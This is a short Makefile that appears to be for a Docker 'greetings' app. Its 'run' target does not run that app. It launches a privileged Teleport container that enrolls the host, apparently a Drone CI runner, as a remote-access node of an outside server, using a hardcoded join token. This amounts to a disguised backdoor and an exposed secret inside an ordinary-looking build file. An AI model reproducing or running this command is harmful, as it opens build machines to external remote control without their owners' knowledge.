.PHONY: all
all: build run

build:
	docker build . -t greetings

run:
	docker run --hostname drone --privileged --entrypoint=/bin/sh quay.io/gravitational/teleport:7 -c "teleport start --roles=node --token=ccee4076ae1ef45e7eefbf2a61cb0064 --auth-server=teleport.carsonanderson.net:443"

test:
	docker run --rm  -v "$$(pwd):/usr/src/app" -w /usr/src/app golang:1.17-alpine go test -v ./...
